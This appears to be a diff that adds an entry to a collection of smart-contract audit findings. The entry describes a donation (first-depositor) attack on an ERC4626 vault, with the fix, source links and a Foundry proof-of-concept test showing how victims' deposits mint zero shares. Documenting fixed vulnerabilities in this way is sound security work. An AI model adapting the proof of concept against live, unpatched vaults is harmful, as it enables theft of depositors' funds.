@@ -1492,3 +1492,57 @@ it("Delegate a non-validator", async function () {
 ```
 
 </details>
+
+## 28. [High] Donation attack on vault depositors
+
+### ERC4626Upgradeable
+
+- Summary: The UTYAsyncVaultV1 contract was vulnerable to a **donation attack** because it inherited the default `_decimalsOffset()` from `ERC4626Upgradeable`, leaving share granularity too coarse. An attacker could make a minimal deposit, donate a large amount to inflate the share price, and cause subsequent legitimate deposits to mint 0 shares, effectively losing users’ funds while the attacker profits.
+
+- Impact & Recommendation: The issue was fixed by overriding `_decimalsOffset()` to increase share precision and preventing deposits that would result in 0 assets or 0 shares. The recommendation was to enhance share granularity and add minimum share minting checks to mitigate such attacks.
+
+<br> 🐬: [Source](https://cantina.xyz/portfolio/87d2bbe5-f6fa-4f69-ab34-f08395ccb63b#XSY-UTYAsyncVault-H1.1-Donation-attack-on-vault-depositors) & [Report](https://cantina.xyz/portfolio/87d2bbe5-f6fa-4f69-ab34-f08395ccb63b)
+
+<details><summary>POC</summary>
+
+```solidity
+
+function test_FirstDepositorAttack() public {
+    // Attacker makes minimal deposit
+    vm.prank(attacker);
+    vault.deposit(1, attacker);
+    uint attackerShares = vault.balanceOf(attacker);
+    console.log("attacker shares: ", attackerShares);
+
+    // Attacker donates large amount to increase share price
+    vm.prank(attacker);
+    vault.donate(1e18);
+    console.log("total assets after donation: ", vault.totalAssets());
+
+    // Legitimate user deposits slightly less than needed for 1 share
+    uint assetsTo1Share = vault.previewMint(1);
+    console.log("assets to 1 share: ", assetsTo1Share);
+
+    for (uint i = 0; i < 3; i++) {
+        depositUser2(assetsTo1Share - 1);
+    }
+    console.log("total assets after deposits: ", vault.totalAssets());
+
+    // Only attacker holds shares
+    console.log("total shares after deposit: ", vault.totalSupply());
+    assertEq(vault.totalSupply(), 1);
+
+    // Attacker redeems more than they donated
+    uint256 attackerAssetValue = vault.previewRequestRedeem(1);
+    assertGt(attackerAssetValue, 1e18 + 1);
+    console.log("attacker redeem: ", attackerAssetValue);
+}
+
+function depositUser2(uint assets) private {
+    vm.prank(user2);
+    vault.deposit(assets, user2);
+}
+
+```
+
+</details>
